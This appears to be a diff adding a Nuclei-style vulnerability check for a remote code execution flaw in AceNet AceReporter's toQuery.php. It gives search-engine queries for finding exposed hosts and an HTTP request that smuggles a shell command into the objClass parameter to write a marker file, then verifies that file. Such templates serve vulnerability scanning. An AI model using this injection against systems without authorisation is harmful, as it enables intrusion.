@@ -1,0 +1,37 @@
+id: CNVD-2021-52316
+
+info:
+  name: "AceNet AceReporter Report 组件 toQuery.php 远程代码执行漏洞"
+  author: qwtd
+  severity: critical
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.favicon.hash:-1595726841
+    fofa-query: body="Login @ Reporter"
+  tags: AceNet-AceReporter
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    GET /view/Behavior/toQuery.php?method=getList&objClass=%0aecho%20%27NdayTest%27%20>/var/www/reporter/view/Behavior/f029ff010012ms.txt%0a HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
+
+- raw:
+  - |
+    GET /view/Behavior/f029ff010012ms.txt HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
+  - type: status
+    status:
+    - 200
